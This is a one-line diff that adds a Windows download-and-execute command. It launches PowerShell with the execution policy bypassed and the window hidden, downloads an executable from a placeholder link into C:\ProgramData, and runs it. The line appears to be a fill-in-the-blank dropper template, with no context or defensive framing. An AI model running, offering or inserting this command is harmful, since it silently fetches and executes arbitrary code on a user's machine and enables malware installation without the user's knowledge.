@@ -1,0 +1,1 @@
+Cmd /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('direct download link here','C:\ProgramData\anything.exe');Start-Process 'C:\ProgramData\anything.exe'
